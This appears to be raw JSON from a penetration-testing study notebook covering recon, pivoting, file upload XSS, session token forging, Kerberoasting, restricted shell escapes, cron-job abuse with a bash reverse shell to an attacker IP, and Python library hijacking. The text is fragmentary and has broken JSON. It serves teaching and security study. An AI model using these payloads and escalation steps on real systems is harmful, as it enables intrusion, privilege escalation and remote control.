This heavily relies on Open-Source Intelligence (OSINT) gathering. OSINT helps gather as much data as possible that is publically available on the internet. These types of pentests are the most common because many compliance organizations dictate that an external network pentest must be performed annually.\n",

    "* **`Internal Network Pentest`:** Assesses an organization's security from the inside of the network, which means that the perimeter has already been breached. This heavily relies on Active Directory (AD) attacks as 90-95% of organizations use AD. \n",
    "\n",
    "* **`Web Application Pentest`:** The second most common type of penetration test, after the external. There is a broad attack surface and the methodology focuses on web-based attacks and the OWASP testing guidelines. \n",
    "\n",
    "* **`Wireless Pentest`:** Assesses an organization's wireless network security. Depending on the wireless type being used, the methodology will vary: if a guest network, segmentation will be tested; if WPA2-PSK is being used, the PSK will be tested for password strength; if WPA2 Enterprise is being used, several other attacks can be attempted. To perform a wireless pentest, a wireless network adapter will be needed to perform packet injection. \n",

    "**1. `Reconnaissance`:** Gathering information about the target system or network. The goal is to collect as much information as possible to understand the target and identify potential entry points. There are two main forms:\n",
    "   * **Passive:** Collecting information about a target without directly interacting with the target system or network to remain undetected. This includes searching publicly available information, browsing websites, and examining DNS records.\n",
    "\n",
    "   * **Active:** Gathering information about a target network or system by actively engaging with it. It often involves techniques that directly interact with the target to obtain information, like sending pings, performing DNS queries, or using tools like Nmap to discover hosts and services. \n",
    "\n",
    "**2. `Scanning`:** Actively probe the target system or network to discover open ports, services, and vulnerabilities. This step identifies potential weaknesses that can be exploited.\n",
    "   * Port scanning, network mapping, and vulnerability scanning\n",
    "\n",
    "**3. `Gaining Access`:** In this stage, the ethical hacker attempts to gain unauthorized access to the target system or network.\n",
    "   * Password cracking, social engineering, and exploiting software vulnerabilities to gain access to the target system; essentially exploit vulnerabilities discovered during the scanning stage.\n",
    "\n",
    "**4. `Maintaining Access`:** Once access is gained, the hacker should aim to maintain access to the compromised system or network. The goal is to mimic the actions of a real attacker and assess the potential impact of a successful compromise\n",
    "   * Bypassing security mechanisms, setting up backdoors or remote access tools, and establishing persistent access.\n",
    "      \n",
    "**5. `Covering Tracks`:** The final step involves the hacker removing traces of their activities from the target system or network. The goal is to ensure that the hacking activity remains undetected, leaving no evidence of the penetration testing. \n",
    "   * Deleting logs, modifying or removing files, and restoring the system to its original state. \n"

    "\n",
    "* Both communication participants can establish the data channel via **TCP port 20.** This channel is used exclusively for data transmission, and the protocol watches for errors during this process.

With this FTP connection, the server announces a port through which the client can establish the data channel; since the client initiates the connection in this method, the firewall does not block the transfer. \n",

    "While SNMP was created to monitor network device, it also transmits control commands using agents over **`UDP port 161`.** The client can set specific values in the device and change options and settings with these commands. It is always the client who actively requests information from the server; SNMP also enables the use of **`\"traps\" over UDP port 162`,** which are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side. For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides; this addressing mechanism for successfully transmitting data and network monitoring using SNMP.\n",
    "\n",
    "Before getting into footprinting, the following concepts must be understood:\n",
    "* **`MIB`:** To ensure that SNMP access works across manufacturers and with different client-server combinations, the **Management Information Base (MIB)** was created. MIB is an independent format for storing device information.\n",
    "  * A MIB is a text file in which all querybale SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one **Object Identifier (OID),** which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object\n",
    "\n",
    "  * MIB files are written in the **Abstract Syntax Notation One (ASN.1)** based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.\n",
    "\n",
    "* **`OID`:** An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them\n",
    "  * The OIDs consist of integers and are usually concatenated by dot notation. A user can look up many MIBs for the associated OIDs in the **Object Identifier Registry.**\n",

It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify the network data. Besides this, SNMPv1 does not support encryption, so the data can be easily intercepted. \n",
    "\n",
    "* **`SNMPv2`:** There are many versions of SNMPv2, but the primary version in use today is **`v2c`,** where the extenction **c** means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption\n",

    "\n",
    "**`Pivoting`** is the idea of moving to other networks through a compromised host to find more targets on different network segments. Pivoting may use multiple hosts to cross network boundaries they would not usually have access to. This enables an attacker to move deeper into a network by compromising targeted hosts or infrastructure. The main objective is to defeat segmentation (physically and virtually) to access an isolated network\n",
    "   * i.e., the target had their network physically and logically separated, making it difficult for an attacker to move around and fully compromise the network. The attacker had to search the network and compromise a host that had access to another environment, as the endpoint has more than one NIC connected to different networks. This host will now be the jump/pivot host\n",
    "   * Allows an attacker to delve deeper into the networks accessing previously unreachable environments. \n",

    "* **`Tunneling`** is a subset of pivoting: it encapsulates network traffic into another protocol and routes traffic through it. For example, using HTTP to mask the C2 traffic from an attacking server to the host. *Obfuscation* is critical to avoid detection for as long as possible. For tunneling, protocols with enhanced security measures like HTTPS over TLS or SSH over other transport protocols are used. These types of attacks enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network. \n",
    "   * i.e., typical applications like VPNs or specialized browsers are a form of tunneling network traffic. \n",
    "   * Tunneling was previously used to craft traffic to hide in HTTP and HTTPS. This is a common way to maintain a C2 of the compromised hosts within a network. Instructions can be masked inside GET and POST requests that appear as normal traffic, essentially looking like a normal web request/response to any website. If the packet were formed properly, it would be forwarded to the control server; if it were not, it would be redirected to another website, potentially throwing off the blue team member checking it out. \n",
    "\n",
    "**`Port Forwarding`** is a technique that allows an attacker (or a defender depending on the context) to redirect a communication request from one port to another. This uses TCP as the primary communication layer to provide interactive communication for the forwarded port; however, different application layer protocols like SSH or SOCKS (not L7) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on a compromised host to pivot to other networks. Port forwarding is also a type of pivoting. \n",

    "   * This can be done by starting a SOCKS listener on the local host, and then configuring SSH to forward that traffic via SSH to the corresponding network after connecting to the target host. This is called **SSH tunneling over SOCKS (Socket Secure) proxy.** \n",
    "      * SOCKS is a protocol that helps communicate with machines where there are firewall restrictions in place. In the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client. \n",
    "\n",
    "This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. A SOCKS proxy can also be useful for pivoting and forwarding data, as they can pivot via creating a route to an external server from NAT networks. As of now, there are currently two types of SOCKS proxies: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does. \n",

Using proxychains, the IP address of the requesting host can be hidden as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies. \n",
    "\n",
    "To inform proxychains that port 9050 is to be used, modify the proxychains configuration file (/etc/proxychains.conf).

Once this is done, start nmap with proxy chains using the following command, as it will route all the packets of nmap to the local port 9050, where the SSH client is listening, which will forward all the packets over SSH to the remote network (unaccessible from the attack host, but accessible from the target machine since it is directly connected to this network):\n",

It is not enough to only test the file extensions. This is why many modern web servers and web apps also test the content of the uploaded file to ensure it matches the specified type. While extension filters may accept several extensions, content filters usually specify a single category (i.e., images, videos, documents), which is why they do not typically use blacklists or whitelists. THis is because web servers provide functions to check for the file content type, and it usually falls under a specific category.\n",

However, since the browser sets this, this operation is a client-side operation, and can be manipulated to change the perceived file type and potentially bypass the type filter. \n",
    "\n",
    "Once this is determined, start **fuzzing the Content-Type Header** with seclists' **`Content-Type`** wordlist through **`Burp Intruder`** to see which types are allowed. If the error message specifies that only the images are allowed, limit the scan to image types:\n",

The most basic example is when a web app allows users to upload HTML files. Although HTML files won't allow the execution of code, it would still be possible to implement JS code within them to carry an **XSS** or **CSRF** attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.\n",
    "\n",
    "Another example of XSS attacks is web apps that display an image's metadata after its upload. For such web apps, an XSS payload can be included in one of the metadata parameters that accept raw text, like the Comment parameter:\n",
    "```bash\n",
    "exiftool -Comment=' \"><img src=1 onerror=alert(window.origin)>' xss.jpg\n",

Furthermore, if the image's MIME-Type is change to **`text/html`,** some web apps may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed. \n",
    "\n",
    "XSS attacks can also be carried with SVG images, along with several other attacks. SVG images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, their XML data can be modified to include an XSS payload:\n",

Similarly, if the web app allows the upload of XML documents, then the same payload can carry the same attack when the XML data is displayed on the web app. \n",
    "\n",
    "While reading system files like `/etc/passwd` can be useful for server enumeration, it can have an even more significant benefit for web pentesting, as it allows the attacker to read the web app's source files. Access to the source code will enable attackers to find more vulnerabilities to exploit within the web app through **Whitebox Pentesting.** For file upload exploitation, it may allow an attacker to locate the upload directory, identify allowed extensions, or find the file naming scheme. \n",

Session tokens are unique identifiers a web application uses to identify a user. More specifically, the session token is tied to the user's session. If an attacker can obtain a valid session token of another user, the attacker can impersonate the user to the web application, thus taking over their session. \n",

    "Suppose a session token does not provide sufficient randomness and is cryptographically weak. In that case, valid session tokens can be brute forced. This can happen if a session token is too short or contain static data that does not provide randomness to the token; i.e., the token provides insufficient entropy. For instance, consider a web application that assigns a token consisting of hardcoded prepended and appended values, while only a small part of the session token is dynamic to provide randomness. \n",
    "\n",
    "Assume a session token is 32 characters long; thus, it seems infeasible to enumerate other users' valid sessions. However, send the login request multiple times and take note of the session tokens assigned by the web application. If all the session tokens are similar, that indicates that it consists of a static string followed by a prepended/appended string. This would reduce the effective randomness of the session tokens, clearly. At this point, active sessions can be hijacked by brute forcing the values. \n",
    "* In other cases, the session identifier can be incremented\n",
    "\n",
    "It is crucial to capture multiple session tokens and analyze them to ensure that session tokens provide sufficient randomness to disallow brute force attacks against them. In a more realistic scenario, the session token provides sufficient randomness on the surface; however, the generation of session tokens is never truly random. It can be predicted by an attacker with insight into the session token generation logic. The simplest form of predictable session tokens contains encoded data that can be tampered with. Start by analyzing the encoded data, and then try to decode it:\n",

    "```bash\n",
    "echo -n 'user=nameduser;role=admin' | base64\n",

    "Another variant of session tokens contains the result of an encryption of a data sequence. A weak cryptographic algorithm could lead to privilege escalation or authentication bypass, just like plain encoding. Improper handling of cryptographic algorithms or injection of user-provided data into the input of an encryption function can lead to vulnerabilities in the session token generation; however, it is often challenging to attack encryption-based session tokens in a balck box approach without access to the source code responsible for session token generation."

Two of the most popular template engines are **`Jinja`** and **`Twig`.**\n",

    "Template engines typically require two inputs: a template and a set of values to be inserted into the template. The template can typically be provided as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values. The values are provided as key-value pairs so the template engine can place the provided value at the location in the template marked with the corresponding key. Generating a string from the input template and input values is called **rendering.** The template syntax depends on the concrete template engine used. \n",

If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely. If an attacker can control the template parameter, SSTI can occur. If templating is implemented correctly, user input is always provided to the rendering function in values and never in the template string; however, SSTI can occur when user input is inserted into the template before the rendering function is called on the template. \n",

Most service accounts have these privileges enabled, while most user accounts do not; however, user privilege enumeration should be done regardless for other attack routes.\n",
    "\n",
    "There are several ways to conduct this attack, either via metasploit or manual exploitation. If on a **meterpreter shell,** confirm this vulnerability with the `post/multi/recon/local_exploit_suggester` module; if on a reverse/bind shell, copy the output from the systeminfo command and put it in a file on the attack host, then run **[Windows Exploit Suggester](#windowsprivescautomatedtools).**\n",

The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones.

It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL. The following attack is very common, and can be performed when DNS is run on a domain controller:\n",

Confirm Group Membership:** If the DLL correctly loaded, the current user will be added to the Domain Admins group, or the attack host will receive a reverse shell if the custom DLL was made to give a connection back. After confirming group membership, **sign out of the account** for the changes to take place. Even if the user is added to the Domain Admins group, their privileges will not yet be enabled until signing out of the account and signing back in. \n",

As such, the same payload can be used to create a reverse shell or add the user to the Administrators group; the malicious DLL will have to be renamed with the DLL that is originally being sought out for from the executable.

    "|**External Reconnaissance**|T1589|Extremely hard to detect and defend against. An attacker does not have to interact with the environment directly, so it's impossible to tell when it is happening. However, **monitor and control publically released information** such as job postings, documents (and the attached metadata), and other open information sources like BGP and DNS records. Scrub documents before release can ensure an attacker cannot glean user naming context from them as an example|\n",
    "|**Internal Reconnaissance**|T1595|Often considered an active phase and, as such, will generate network traffic that can be monitored and defended. **Monitoring network traffic** for any suspicious bursts of packets of a large volume from any one source or several sources can be indicative of scanning. **A properly configured Firewall or Network Intrusion Detection System (NIDS)** will spot these trends quickly and alert on the traffic. Depending on the tool or appliance, it may even be able to add a rule blocking traffic from said hosts proactively. The use of network monitoring coupled with a SIEM can be crucial to spotting reconnaissance. Properly tuning the Windows Firewall settings or the EDR to not respond to ICMP traffic, among other types of traffic, can help deny an attacker any information they may glean from the results|\n",
    "|**Poisoning**|T1557|Using security options like **SMB message signing and encrypting traffic** with a strong encryption mechanism will go a long way to stopping poisoning & man-in-the-middle attacks. SMB signing uses hashed authentication codes and verifies the identity of the sender and recipient of the packet. These actions will break relay attacks since the attacker is just spoofing traffic|\n",
    "|**Password Spraying**|T1110/003|This is one of the easiest attacks to detect and defend against. Logging and monitoring can indicate passwords spraying attacks in the network. Look for **Event IDs 4624 and 4648 for strings of invalid attempts. Having strong password policies, an account lockout policy set, and using two-factor or multi-factor authentication** can all help prevent the success of a password spray attack|\n",
    "|**Credentialed Enumeration**|TA0006|There is no real defense that can stop this method of attack. Once an attacker has valid credentials, they effectively can perform any action that the user is allowed to do. Monitoring for unusual activity such as issuing commands from the CLI when a user should not have a need to ise it. Multiple RDP requests sent from host to host within the network or movement of files from various hosts can all help tip a defender off. If an attacker manages to acquire administrative privileges, this can become much more difficult, but there are network heuristics tools that can be put in place to analyze the network constantly for anomalous activity. **Network segmentation** can help a lot|\n",
    "|**LOTL**|N/A|It can be hard to spot an attacker while they are using the resources built-in to host operating systems. This is where having a baseline of network traffic and user behavior comes in handy. Watching for command shells and using a properly configured Applocker policy can help prevent the use of applications and tools users should not have access to or need|\n",
    "|**Kerberoasting**|T1558/003|There are plenty of ways to spot and defend against Kerberoasting. The best way is to use a **stronger encryption scheme** than RC4 for Kerberos authentication mechanisms. **Enforcing strong password policies** can help prevent Kerberoasting attacks from being successful. **Using Group Managed service accounts** eliminates the risk of Kerberoasting, so it should also be done if possible. Also, **periodically auditing users' account permissions** for excessive group membership can be an effective way to spot issues|"

Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations like `%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe` or `PowerShell_ISE.exe`.

    "> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or an NTLM hash), a shell in the context of a domain user, or account such as system. It is also necessary to know which host in the domain is a domain controller so that it can be queried **Cross-Forest Kerberoasting** is mentioned in the *Attacking Domain Trusts* section\n",
    "\n",
    "Kerberoasting is a lateral movement/privilege escalation technique in AD environments. This attack targets **Service Principal Names (SPN) accounts,** which are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\\LOCAL SERVICE. ANy domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. \n",
    "\n",
    "Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested memberships. Kerberoasting essentially takes advantage of these service accounts by requesting a **Ticket Granting Service (TGS)** ticket from the **Key Distribution Center (KDC)** for a specific service, and decrypts the ticket to obtain the service's account password. The process looks as follows:\n",
    "\n",
    "**`1. User Requests a Ticket Granting Ticket (TGT)`:** The user sends this request to the KDC, which is typically hosted on the domain controller. This request includes the user's username and timestamp, encrypted with the user's password hash. \n",
    "   * Any user within the domain can request a TGT to the domain controller, so if an account is compromised, an attacker can send one too\n",
    "\n",
    "**`2. KDC Issues the TGT`:** If the username and password hash provided by the user are valid, the KDC sends back a TGT. The TGT is encrypted with the KDC's secret key. \n",
    "\n",
    "**`3. User Requests a Service Ticket (TGS)`:** Once the user receives the TGT, they request a TGS ticket from the domain controller. In order to request the TGS, the user must present the TGT to the domain controller as proof of their identity. This request also specifies the service the user wants to access\n",
    "\n",
    "**`4. KDC Issues the TGS`:** If the TGT is valid, the KDc sends back a TGS ticket to the user. \n",
    "   * The TGS is encrypted with the serverice account's account hash, and contains a session key that the user and the service can use to communicate securely.\n",
    "   * Attackers often target this step, as they can attempt to decrypt the TGS ticket to gain access to the application server's account hash. \n",
    "      * Attackers can use `Hashcat` or `John` to get the service account's password hash, which can be used for lateral movement or privilege escalation\n",
    "   * Obtaining a TGS ticket via Kerberoasting does not guarantee a set of valid credentials. Kerberoasting and the presence of SPNs do not guarantee any level of access.\n",
    "      * TGS tickets take longer to crack than other formats such as NTLM hashes, so unless a weak password is set or the wordlist contains the exact password, it can be difficult or impossible to obtain the cleartext using a standard cracking tool. \n",
    "\n",
    "**`5. User Presents the TGS Ticket to the Application Server`:** The user sends the TGS to the application server they want to access. The TGS serves as proof that the user has been authenticated by the KDC and is authorized to access the server\n",
    "\n",
    "**`6. Application Server Validates the TGS`:** The application server decrypts the TGS by using the service account's password hash to verify the user's identity and permissions. \n",
    "   * If the TGS is valid, the application server allow the user to authenticate\n",
    "   * If the TGS is invalid or the user lacks permissions, access is denied. \n",
    "\n",
    "Service accounts are often configured with weak or reused passwords to simplify administration, and sometimes, the password is the same as the username. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, it can be used to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, the MSSQL service can be accessed as sysadmin, xp_cmdshell extended procedure can be enabled, and arbitrary code execution can be gained on the target SQL server. \n",
    "\n",

By default, authenticated users can add up to 10 computers to a domain; when doing so, the name of the new host is changed to match a domain controller's SamAccountName. Once done, Kerberos tickets can be requested causing the service to issue the attacker tickets under the DC's name instead of the new name.

This technique allows an unauthenticated attacker to take over a Windows domain where AD Certificate Services (AD CS) is in use. \n",

Some common examples of restricted shells include the following:\n",

    "For example, administrators often use restricted shells in enterprise networks to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. By limiting the user's ability to execute specific commands or access certain directories, administrators can ensure that users cannot perform actions that could harm the system or compromise the network's security. Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user. \n",
    "\n",
    "Several methods can be used to escape from a restricted shell: some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell. The following are a few methods that can be used to escape from a restricted shell:\n",
    "\n",
    "**<u>Command Injection</u>**\n",
    "\n",
    "Imagine being in a restricted shell that allows execution of commands by passing them as arguments to the ls command. Unfortunately, the shell only allows the execution of the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow the execution of any other commands. In this situation, command injection can be used to escape from the shell by ibjecting additional commands into the argument of the ls command. For example, the following command can be used to inject a `pwd` command into the argument of the ls command:\n",
    "```bash\n",
    "ls -l `pwd`\n",
    "\n",
    "```\n",

Since the pwd command is not restricted by the shell, this would allow the execution of the pwd command to see the current working directory, even though the shell does not allow the execution of the pwd command directly\n",
    "\n",
    "<br>\n",
    "\n",
    "**<u>Command Substitution</u>**\n",

    "Command substitution involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks `. In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell:\n",
    "\n",
    "<br>\n",
    "\n",
    "**<u>Command Chaining</u>**\n",
    "\n",
    "With command chaining, multiple commands would need to be used in a single command line, separated by a shell metacharacter such as a semicolon `;` or a vertical bar `|` to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell. \n",

    "\n",
    "<br>\n",
    "\n",
    "**<u>Environment Variables</u>**\n",
    "\n",
    "For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.\n",
    "\n",
    "Determine which commands are usable by the restricted shell user. If echo is available but cat is not, files can be read with the following command:\n",

    "\n",
    "<br>\n",
    "\n",
    "**<u>Shell Functions</u>**\n",
    "\n",
    "In some cases, it may be possible to escape from a restricted shell by using shell functions. For this, a shell function can be defined and called to execute commands not restricted by the shell. Essentially, if the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command."

They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The **`crontab`** command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in **`/var/spool/cron`** for the specific user that creates it. **Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands.** For example, the following entry would run every 12 hours:\n",

    "The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. There may be a world-writable script that runs as root and even if the crontab cannot be read to know the exact schedule, it still may be possible to know how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours). In this case, a command can be appended onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.\n",
    "\n",
    "Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them. First, **look around the system for any writeable files or directories and determine whether the file is running on a cron job.**\n",

In this case, when looking at the `/dmz-backups`, it will be determined that files are created every three minutes. This is clearly a major misconfiguration because the backups are happening too frequently. Also in this example, the `backup.sh` shell script is world writeable and runs as root. \n",
    "\n",
    "It is possible to confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), which views the running processes without the need for root privileges.

When running `pspy`, the `-pf` tells the tool to print commands and file system events and the `-i 1000` tells it to scan procfs every second (1000 ms).\n",
    "\n",
    "In this example, the cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creates a tarball file of the contents of the `/var/www/html` directory. Now that this has been discovered, attempt to append malicious commands to the end of the script to still run properly before executing the reverse shell command.

    "tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR\n",
    "\n",
    "```\n",
    "Again, because `backup.sh` is globally writeable, this can be modified. The original script takes the source and destination directory as variables and then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. In the following script, this original file is modified to add a bash reverse shell:\n",
    "```bash\n",
    "#!/bin/bash\n",
    "SRCDIR=\"/var/www/html\"\n",
    "DESTDIR=\"/dmz-backups/\"\n",

    " \n",
    "bash -i >& /dev/tcp/<IP Address>/<PORT> 0>&1\n",
    "\n",
    "```\n",
    "At this point, open a local netcat listener and wait. Once the cron job runs, a root shell will be created on the attacker's terminal. It is important to note that this type of attack is not very common, but poorly configured cron jobs can be abused at times.\n"

It uses containers as isolated environments in user space that run at the OS level and share the file system and system resources. One advantage is that containerization consumes significantly fewer resources than a traditional server or virtual machine. The core feature of Docker is that applications are encapsulated in **Docker containers** and can be used for any OS. A docker container represents a lightweight standalone executable software package that contains everything needed to run an application code runtime. \n",

    "   * The docker daemon is also critical in **storage management,** since it handles Docker volumes, which are used to persist data beyond the lifespan of containers and manages volume creation, attachement, and clean-up, allowing containers to share or store data independently of each other\n",
    "* **`Docker Client`:** Acts as the interface for issuing commands and interacting with the Docker ecosystem.\n",
    "   * When interacting with Docker, **commands are issued through the Docker Client,** which communicates with the Docker daemon (through a RESTful API or a Unix socket) and serves as the primary means of interacting with Docker. \n",
    "      * Through this, Docker images can be created, started, stopped, managed, removed searched, and downloaded. With these options, existing images can be pulled to use as a base for the containers or custom images can be built via Dockerfiles. There is also the flexibility to push images to remote repositories, facilitating collaboration and sharing within teams or with the wider communities\n",
    "      * In contrast, the daemon carries out the requested actions, ensuring containers are created launched, stopped, and removed as required\n",

It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations. An image is a self-contained, read-only package that ensures consistency and reproducibility across different environments. Images can be created using a text file called a **Dockerfile,** which defines the steps and instructions for building the image. \n",

This isolation ensures that applications within containers remain separate from the underlying host system and other containers, preventing conflicts and interference. \n",

With shared directories, specific directories or files on the host system can be made accessible within the container. This is useful for persisting data, sharing code, and facilitating collaboration between development environments and Docker containers; however, it always depends on the setup of the environment and the goals that administrators want to achieve. To create a shared directory, a path on the host system and a corresponding path within the container is specified, creating a direct link between the two locations. \n",
    "   * Shared directories offer several advantages, including the ability to persist data beyond the lifespan of a container, simplify code sharing and development, and enable collaboration within teams. It's important to note that shared directories can be mounted as read-only or read-write, depending on specific administrator requirements. \n",

    "\n",
    "```\n",
    "**2. Docker [daemon] Sockets:** A special file that allows admins and processes to communicate with the Docker dameon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of the Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When issuing a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn processes the command and carries out the requested actions.\n",

Acess to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon\n",

This remote API access expands the possibilities for distributed Docker setups and remote management scenarios; however, depending on the configuration, there are many ways where automated processes or tasks can be stored. Those files can contain useful information for attackers to escape the Docker container\n",

This can be confirmed by the `id` command. Alternatively, Docker may have SUID set, or the logged in user may be in the Sudoers file, which permits them to run docker as root. All three options allow privilege escalation through Docker. \n",
    "\n",
    "Most hosts have a direct internet connecttion because the base images and containers must be downloaded; however, many hosts may be disconnected from the internet at night and outside working hours for security reasons.

    "In terms of authentication, Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user's identity. Once the user has been authenticated, Kubernetes enforces authorization decisions using RBAC. This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources; therefore, Kubernetes' authentication and authorization process is a comprehensive security measure that ensures only authorized users can access resources and perform operations. \n",
    "\n",
    "In Kubernetes, the kubelet can be configured to permit anonymous access. By default, the Kubelet allows anonymous access. **Anonymous requests are considered unauthenticated, which implies that any request made to the kubelet without a valid client certificate will be treated as anonymous.** This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions:\n",

In the message key, the **`System:anonymous`** will be present, which typically represents an unauthenticated user, meaning that access to the API server is anonymous attempted. In the example, the root path is attempted, which would grant significant control over the Kubernetes cluster if successful; by default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API serer will likely deny the request with a 403 Forbidden status code\n",

Namespace information can provide insights into how the pods and resources are arranged within the cluster, which can be used to target specific namespaces with known vulnerabilities. Metadata, like uid and resourceVersion, can be used to perform reconnaissance and recognie potential targets for further attacks. Disclosing the last appliced configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens used during the deployment of the pods. \n",

    "There are many ways in which a Python library can be hijacked. Much depends on the script and its contents itself; however, there are three basic vulnerabilities where hijacking can be used:\n",
    "\n",
    "**<u>Wrong Write Permissions</u>**\n",
    "\n",
    "Imagine being on a target machine that is connected to the company's intranet and the target works with Python. There are three connected components. The Python script imports a python module and the privileges of the script as well as the permissions of the module. One or another Python module may have write permissions set for all users by mistake. This allows the Python module to be edited and manipulated so that an attacker can insert commands or functions that will escalate privileges. If SUIF/SGID permissions have been assigned to the Python script that imports this module, the code will automatically be included. \n",
    "\n",
    "Begin by looking at the set permissions of the script to determine whether it has a SUID set. If set, the script can be executed with the privileges of another user, potentially even root. View the script and read its contents if possible. In this case, the following script is on the target machine with SUID set:\n",
    "```python\n",
    "#!/usr/bin/env python3\n",
    "import psutil\n",
    "\n",
    "available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total\n",
    "\n",
    "print(f\"Available memory: {round(available_memory, 2)}%\")\n",
    "\n",
    "```\n",
    "While script is simple, the main points of focus are the imported module (psutil) and the function from the module (virtual_memory()). Look for this function in the folder of psutil and check if the module has write permissions:\n",
    "```bash\n",
    "grep -r \"def virtual_memory\" /usr/local/lib/python3.8/dist-packages/psutil/*\n",
    "\n",
    "ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py      #this is the correct library to look for the write permissions\n",
    "\n",
    "```\n",
    "If in a developer environment, this will likely have write permissions for everyone, as many developers work on different scripts and may require higher privileges. In this case, the following is the exact portion of the library that can be edited as it is the function being called:\n",
    "```python\n",
    "def virtual_memory():\n",
    "\t...SNIP...\n",
    "   global _TOTAL_PHYMEM\n",
    "   ret = _psplatform.virtual_memory()\n",

    "   _TOTAL_PHYMEM = ret.total\n",
    "   return ret\n",
    "\n",
    "```\n",
    "It is recommended to **put the malicious code right at the beginning of the function.** There, everything can be inserted that is correct and effective. Import the module os for testing purposes, which allows an attacker to execute system commands. With this, insert the command id and check during the execution of the script if the inserted code is executed:\n",
    "```python\n",
    "def virtual_memory():\n",
    "\t...SNIP...\n",
    "\t#### Hijacking\n",
    "\timport os\n",
    "\tos.system('id')\n",
    "\n",
    "   global _TOTAL_PHYMEM\n",
    "   ret = _psplatform.virtual_memory()\n",
    "   # cached for later use in Process.memory_percent()\n",
    "   _TOTAL_PHYMEM = ret.total\n",
    "   return ret\n",
    "```\n",
